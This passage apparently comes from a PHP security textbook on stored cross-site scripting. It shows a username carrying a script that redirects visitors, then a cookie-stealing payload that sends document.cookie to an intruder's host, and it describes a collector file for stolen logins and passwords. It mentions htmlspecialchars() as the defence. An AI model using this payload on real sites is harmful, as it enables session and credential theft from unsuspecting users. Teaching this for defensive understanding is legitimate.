  md: '# II.5.8. Stealing Cookies


    Now, to redirect any visitor to the http://www.softtime.ru/ site, it is enough
    to register the user with the following name: new user<script>location.href=''http://www.softtime.ru'';</script>.


    To ensure protection against this kind of vulnerability, it is necessary to process
    any data supplied from the client machine and displayed in the browser window
    using the htmlspecialchars() function.


    Assume that you know that in the course of user authorization two cookies are
    in stalled, called name and pass.


    # II.5.15. Setting cookies


    ```

    <?php

    setcookie("name", $name, time() + 3600*24);

    setcookie("pass", $pass, time() + 3600*24);

    ?>

    ```


    Using the vulnerability described in the previous section, it is possible to retrieve
    cookies with JavaScript and send them to the intruder''s site using the code shown
    in Listing II.5.16.


    # II.5.16. Stealing cookies


    ```

    <script>

    location.href=''http://www.chackhost.ru/index.php?cookie=''+escape(document.cookie);

    </script>

    ```


    Thus, it remains to register the following user:


    ```

    new_user<script>location.href=''http://www.chackhost.ru/index.php?cookie=''+escape(document.cookie);</script>

    ```


    Then, prepare a file on the http://www.chackhost.ru site (usually located on a
    free host server) that would store all logins and passwords obtained through the
    cookie parameter.'
